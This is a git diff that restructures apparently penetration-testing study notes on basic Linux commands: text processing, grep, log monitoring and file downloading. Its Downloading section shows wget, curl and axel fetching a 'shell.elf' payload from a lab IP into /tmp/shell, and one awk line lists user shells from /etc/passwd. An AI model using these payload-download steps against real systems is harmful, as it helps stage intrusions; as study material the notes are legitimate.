@@ -1,8 +1,8 @@
 # Basic Commands
 
-## Common
+## Searching
 
-### apropos
+apropos
 
 Search the list of man page descriptions for a possible match based on a keyword.
 
@@ -13,7 +13,7 @@ get-oui (1)          - Fetch the arp-scan OUI file from the IEEE website (on Deb
 whatweb (1)          - Next generation Web scanner. Identify technologies used by websites.
 ```
 
-### mkdir
+## Create files
 
 ``` bash
 mkdir module one
@@ -23,19 +23,21 @@ mkdir "module one"
 mkdir -p module/{one,two,three}
 ```
 
-### Piping
+## Control output
+
+Piping
 
 ``` bash
 sudo ss -antlp | grep sshd
 ```
 
-### sed
+sed
 
 ``` bash
 echo 'Hades' | sed 's/Hades/leecybersec.com/'
 ```
 
-### cut
+cut
 
 ``` bash
 echo "hacking, penetration testing and bug hunting"| cut -f 2 -d " "
@@ -49,32 +51,32 @@ daemon
 bin
 ```
 
-### awk
+awk
 
 ``` bash
 cat /etc/passwd | awk -F ":" '{print $1, ":", $7}' | grep "sh"
 ```
 
-### uniq -c
+uniq -c
 
 ``` bash
 cat list.txt | sort | uniq -c | sort -r
 ```
 
-### grep
+grep
 
 ``` bash
 ifconfig | grep eth0 -C 1 | grep inet | cut -f10 -d' '
 grep -v "Nmap"
 ```
 
-### cutycapt
+cutycapt
 
 ``` bash
 cutycapt --url=$ip --out=$ip.png
 ```
 
-### Redirect
+## Redirect
 
 to a New File
 
@@ -180,8 +182,6 @@ kill 1466                                                                       
 
 ## Monitoring
 
-### tail
-
 ``` bash
 udo tail -f /var/log/apache2/access.log
 192.168.11.130 - - [09/Mar/2021:21:12:03 -0500] "GET / HTTP/1.1" 200 10956 "-" "curl/7.74.0"
@@ -189,27 +189,25 @@ udo tail -f /var/log/apache2/access.log
 ...
 ```
 
-### watch
-
 ``` bash
 watch -n 1 date
 ```
 
 ## Downloading
 
-### wget
+wget
 
 ``` bash
 wget -O /tmp/shell http://192.168.110.131/shell.elf
 ```
 
-### curl
+curl
 
 ``` bash
 curl -o /tmp/shell http://192.168.110.131/shell.elf
 ```
 
-### axel
+axel
 
 ``` bash
 axel -a -n 20 -o /tmp/shell http://192.168.110.131/shell.elf
